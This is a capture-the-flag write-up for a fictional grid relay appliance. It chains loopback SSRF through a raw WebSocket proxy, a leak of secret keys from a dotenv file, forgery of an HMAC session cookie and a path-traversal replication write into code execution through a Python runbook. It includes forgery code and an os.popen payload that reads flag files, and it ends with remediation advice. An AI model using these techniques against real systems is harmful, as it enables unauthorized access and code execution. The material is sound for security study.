### Helioform Relay 4.2

> Web · Not shown · Ahmed Abdelmoemen
> Points at solve: [fill in]

**Tools used**

Python 3 (raw WebSocket HSP client), HMAC-SHA256 session forgery tooling.

**Approach**

Helioform Relay 4.2 (Kovari National Grid) is a single service fronting three things: the public HTTP/console, the customer mesh WebSocket (`/mesh`, `hsp.ws.1`), and a *legacy agent* WebSocket (`hsp.raw.1`). The legacy agent channel is a raw HSP byte stream that exposes a `DIAL` opcode (0x10) to loopback, unauthenticated (`auth=legacy-proxy`). That is the path the provisioner never closed.

Target: `http://<instance>/`
Challenge: walk the appliance end-to-end from the legacy agent wire to the compliance ledger and recover the flag.
Category: Web / protocol chaining (HSP WebSocket, loopback SSRF, HMAC forgery, replication commit → runbook RCE).

Chaining it end-to-end:

1. `DIAL 127.0.0.1:7710` → `catalogd` issues a ticket.
2. `DIAL 127.0.0.1:7711` → `provd` is a dotenv broker; with the ticket it exports `/etc/helioform/relay.env`, leaking the console MAC key and the replication key.
3. The console cookie is a factory HMAC session; forge one with the leaked key and read the peer-trace/runbook pages.
4. `recordd` (7712) exposes status + a peer-only replication write; the replication service lives on 7713. Sign a hello/commit with the leaked replication key and use an **absolute stream id** to write through recordd's stream resolver into `/var/lib/helioform/runbooks/`.
5. Runbooks execute as the relay user; a file beginning with `HSP-RUNBOOK` is then run as Python. `os.popen("cat /flag")` prints `/tmp/flag`.

Recon:

Public surface:

- `/` — overview; `/docs/hsp` — HSP framing and the two WebSocket subprotocols; `/docs/session` — console factory-cookie format; `/console/login`.
- `/mesh` — GET without upgrade: `400 expected websocket upgrade`.

`/docs/hsp` key points: frames are `HSP1` magic (4 ASCII bytes), `u16 opcode`, `u16 flags`, `u32 body length`, all little-endian. Success replies repeat the opcode with flags `0x0001`; errors are opcode `0x007F`. Customer opcodes are HELLO 0x01 / PING 0x02 / SUBSCRIBE 0x03. Agents that cannot mask WS frames request `hsp.raw.1`; after 101 the socket is a raw HSP byte stream, and "loopback services use this same 12-byte header."

Step 1 — legacy agent wire → loopback DIAL:

Handshake `GET /mesh` with `Sec-WebSocket-Protocol: hsp.raw.1`, then send an HSP HELLO (0x01, body free-form). The reply:

```
hsp-edge/4.2 transport=raw auth=legacy-proxy
commands=HELLO:0x01,PING:0x02,DIAL:0x10
dial=host:port
dial-ack=splices
egress=127.0.0.1
```

`DIAL` (0x10) with `127.0.0.1:port` replies `ok splice\n` and splices the raw stream to that loopback port (closed ports return `err: dial failed`). Scanning loopback through it found:

| Port | Service |
|---|---|
| 7710 | `catalogd` (tickets) |
| 7711 | `provd` (dotenv broker) |
| 7712 | `recordd` (status / peer-only write) |
| 7713 | replication service (`repl_port` from recordd status) |
| 8080 | the relay HTTP app itself |

One implementation detail: after `ok splice`, bytes sent immediately are dropped. A ~1s wait after the splice ack before writing is required. (An early full-range port scan through the proxy saturated the edge; scanning 7710–7713/8080 is enough.)

Step 2 — tickets and the provisioner dotenv:

`catalogd` HELLO returns a nonce and its protocol:

```
nonce=<32 hex>
ticket_opcode=0x20   ticket_body=nonce
export_opcode=0x30   export_fields=ticket,path
status_opcode=0x40   status_fields=ticket
services:
127.0.0.1:7710 catalogd
127.0.0.1:7711 provd
127.0.0.1:7712 recordd
```

Ticket = `POST` HSP 0x20 with the nonce (ASCII hex), reply `ticket=tkt.<nonce>.<hex>\nttl=600`.

`provd` HELLO: `provd dotenv broker`, uses export 0x30 with `ticket` and `path` (`body=key=value lines`). It refuses non-`.env` paths and any path outside the provision root. The root is `/etc/helioform`; the file that mattered:

```
# /etc/helioform/relay.env
CONSOLE_MAC_KEY=<redacted>
CONSOLE_ISS=helioform-factory
CONSOLE_AUD=relay-console
REPLICATION_MAC_KEY=<redacted>
MESH_CAPTURE_ENABLED=1
```

(`/etc/helioform/.env`, `site.env`, `console.env`, `provision.env` do not exist; `relay.env` does.)

Step 3 — forged factory console session:

Per `/docs/session`, the cookie is `payload_b64.mac_hex` where `mac_hex = HMAC-SHA256(CONSOLE_MAC_KEY, payload_b64)` lowercase hex, key used as the literal env string (not hex-decoded), and `payload_b64` is unpadded base64url JSON:

```python
payload = {"iss":"helioform-factory","aud":"relay-console",
           "role":"admin","exp":int(time.time())+3600}
b64 = base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).rstrip(b'=')
mac = hmac.new(b'<redacted>', b64, hashlib.sha256).hexdigest()
cookie = b64 + b'.' + mac
```

`GET /console` then exposes `/console/trace` (peer trace) and `/console/automation` (runbooks). The trace decoder documents the `hsp-repl/1` replication protocol:

```
peer hello: u16 peer_len | peer | u32 epoch | tip[32] | mac[32]
hello mac = HMAC(key, "hsp-repl/1|hello|{epoch}|{tip_hex}|{peer}")

commit blob: u16 stream_len | stream_id | u8 mode | u32 epoch | tip[32] | bind[16]
             | u32 body_len | body | mac[32]
blob mac = HMAC(key, "hsp-repl/1|blob|{epoch}|{tip_hex}|{bind_hex}|{stream_id}|{body_sha256}")
mode 0x01 replaces the resolved stream file with body
```

Step 4 — peer-only replication write:

`recordd` status (HSP 0x40 with `ticket=...` on 7712) returns:

```
epoch=7
tip=<64 hex>
bind=<32 hex>
repl_port=7713
write=peer-only
```

On 7713, HSP opcode 0x11 is the hello. Signing it with the *literal* replication key string validates (`mac_hex`-style raw key fails with `err: bad mac`); a stale epoch/tip returns `err: stale tip`, and an unknown peer returns `err: unknown peer` (`relay-collector`, from the trace, is the only accepted peer). After a valid hello the server advances state on a successful write, so **each commit needs a fresh status call** (new tip/bind) and a fresh hello.

The commit opcode is **0x17**, not the obvious 0x12. It was found by sweeping opcodes on recordd's status port: only 0x17 (besides HELLO 0x40/status) was recognized and returned `err: peer handshake required`; 0x12 was `err: unknown opcode`.

Stream-id resolution is the vulnerability:

- relative ids (`probe`, `ledger`, `site/north`, …) → `err: open failed`
- traversal (`../runbooks/x`) → `err: stream id rejected`
- **absolute path** `/var/lib/helioform/runbooks/rb1` → `ok path=/var/lib/helioform/runbooks/rb1`

So a valid commit can replace any file the relay user can write. The runbook directory was targeted.

Step 5 — runbook execution:

`/console/automation` says compliance actions are files in `/var/lib/helioform/runbooks`, executed as the relay user (`uid=999(helio)`), with stdout/stderr shown on the page. Files must start with the `HSP-RUNBOOK` header; the rest is compiled/executed as Python (a shell-style body produced `SyntaxError: invalid syntax` pointing at the code line).

Committed body:

```python
HSP-RUNBOOK
import os
print(os.popen("id; pwd; ls -la /; ls -la /var/lib/helioform; "
               "cat /flag /flag.txt /root/flag /root/flag.txt "
               "/var/lib/helioform/flag* 2>&1").read())
```

Result on `/console/automation`: uid `helio`, `/flag` is a symlink to `/tmp/flag`, and the read succeeded, printing the flag.

**Why it works**

The root weakness is an unauthenticated legacy agent proxy (`hsp.raw.1` / `DIAL 0x10`) splicing arbitrary client bytes to loopback ports. Enumerating those loopback services exposed a ticket issuer (`catalogd`), a dotenv broker (`provd`) that exports secret-bearing files to any ticket holder, and a replication writer (`recordd`/7713) whose stream-id resolution passes absolute paths through to the filesystem. Leaking the dotenv gave the HMAC keys for both the console session cookie and the replication protocol, enabling session forgery, authenticated replication commits that overwrite files in the runbook directory, and finally code execution as the relay user via the `HSP-RUNBOOK` Python runner — with the flag readable at `/flag`.

Remediation:

- Do not expose the legacy agent proxy (`hsp.raw.1` / DIAL) to unauthenticated clients, and restrict egress at the destination allowlist level (agents only, not arbitrary loopback ports).
- Never let a dotenv broker export secret-bearing files to any caller holding a ticket; tickets should be scoped to specific services and non-secret keys.
- Do not sign session cookies with keys the provisioner drops in a dotenv readable by services; use a keystore and rotate.
- The replication write must canonicalize and constrain stream ids to a stream root (reject absolute paths and separators), and must not resolve into the runbook execution directory.
- Runbooks should not be executable-by-write, should not accept absolute-path stream targets, and should run under a user that cannot read the flag.

**Validation**

The committed runbook executed as `uid=999(helio)` and its output on `/console/automation` included the contents of `/flag`; the flag was accepted as the solution.
